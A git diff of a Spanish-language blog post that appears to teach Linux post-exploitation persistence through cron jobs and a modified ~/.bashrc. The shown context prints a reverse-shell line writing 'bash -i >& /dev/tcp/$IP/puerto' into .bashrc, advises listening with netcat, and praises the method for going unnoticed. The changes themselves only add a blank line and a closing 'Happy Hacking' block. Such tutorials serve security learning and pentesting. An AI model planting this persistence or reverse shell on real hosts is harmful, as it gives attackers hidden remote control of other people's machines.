@@ -25,6 +25,7 @@ Esto es bastante útil ya que se puede aprovechar para hacer backups cada x tiem
 Ese archivo se encuentra en la ruta `/etc/crontab` y si miramos lo que hay, seguramente encuentre algo parecido a esto: 
 > ![image](https://github.com/cerodah/blog/assets/82907557/23133ff3-c9c6-4e36-a98c-1a33759a9a4b)
 
+
 Una vez que haya obtenido acceso a cualquier host podrá usted mismo agregar su propia tarea.
 Si mira bien puede ver que está el simbolo (*) presente al lado del numero 17, esto significa que la tarea se ejecutará cada hora. Pues bien , para aprovecharnos podemos agregar esta linea a nuestro archivo cronjob
 ```bash
@@ -54,3 +55,6 @@ echo 'bash -i >& /dev/tcp/$IP/puerto 0>&1' >> ~/.bashrc
 No olvide estar escuchando por netcat por el puerto correspondiente.
 Esta es una técnica un tanto robusta, ya que el usuario no suele mirar este archivo a menos que vaya a configurar algo de la shell.
 
+```
+Happy Hacking ^^
+```
